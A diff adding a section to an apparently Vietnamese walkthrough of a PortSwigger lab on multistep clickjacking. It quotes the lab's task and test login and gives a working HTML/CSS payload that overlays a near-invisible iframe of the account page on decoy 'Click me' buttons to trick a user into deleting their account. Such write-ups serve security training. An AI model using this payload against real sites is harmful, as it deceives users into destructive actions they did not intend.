@@ -164,3 +164,48 @@ Dùng payload sau:
 LAB SOLVED!
 
 <img width="581" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/3725fcce-9957-48f9-a4a3-cd2301b16da5">
+
+***
+
+## 5. Lab: Multistep clickjacking
+
+* Content:
+```
+This lab has some account functionality that is protected by a CSRF token and also has a confirmation dialog to protect against Clickjacking. To solve this lab construct an attack that fools the user into clicking the delete account button and the confirmation dialog by clicking on "Click me first" and "Click me next" decoy actions. You will need to use two elements for this lab.
+
+You can log in to the account yourself using the following credentials: wiener:peter
+```
+* Exploit:
+
+Dùng payload:
+
+```
+<style>
+	iframe {
+		position:relative;
+		width: 700px;
+		height: 700px;
+		opacity: 0.0001;
+		z-index: 2;
+	}
+   .firstClick, .secondClick {
+		position:absolute;
+		top: 500px;
+		left: 60px;
+		z-index: 1;
+	}
+   .secondClick {
+		top: 300px;
+		left: 250px;
+	}
+</style>
+<div class="firstClick">Click me first</div>
+<div class="secondClick">Click me next</div>
+<iframe src="https://0a67007b0495e21280a6a8a8008900a1.web-security-academy.net/my-account"></iframe>
+```
+
+<img width="370" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/11ac09de-87e2-4562-897f-e2cd78b08905">
+
+LAB SOLVED!
+
+<img width="580" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/3cd8898d-0172-4a22-b179-9d472749ec36">
